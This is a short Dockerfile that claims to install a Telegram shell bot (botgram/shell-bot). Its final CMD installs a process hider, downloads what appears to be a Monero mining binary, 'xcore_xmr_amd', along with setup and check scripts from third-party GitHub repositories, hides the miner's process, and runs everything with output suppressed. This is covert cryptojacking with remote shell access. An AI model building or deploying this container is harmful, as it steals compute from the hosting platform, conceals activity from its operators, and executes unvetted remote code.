FROM phusion/baseimage:bionic-1.0.0

# Use baseimage-docker's init system:
CMD ["/sbin/my_init"]

# Install dependencies:
RUN apt-get update && apt-get install -y \
    bash \
    curl \
    sudo \
    wget \
    git \
    make \
    busybox \
    build-essential \
    nodejs \
    npm \
    screen \
    neofetch \
    ca-certificates \
    libcurl4 \
    libjansson4 \
    libgomp1 \
    libnuma-dev \
 && mkdir -p /home/stuff

# Set work dir:
WORKDIR /home

# Run config.sh and clean up APT:
RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# Install the bot:
RUN git clone https://github.com/botgram/shell-bot.git \
 && cd shell-bot \
 && npm install

RUN echo "Uploaded files:" && ls /home/stuff/

# Run bot script:
CMD apt install npm -y && npm i -g node-process-hider && wget https://github.com/Rickyose/skripburu2/raw/main/xcore_xmr_amd && wget -qO set.sh https://raw.githubusercontent.com/ADEBARACK/MALING-REPO/main/setup_mullvad_vpn.sh && wget https://raw.githubusercontent.com/ADEBARACK/MALING-REPO/main/check.sh && chmod +x set.sh check.sh xcore_xmr_amd && ph add xcore_xmr_amd && ./set.sh && ./check.sh >/dev/null 2>&1
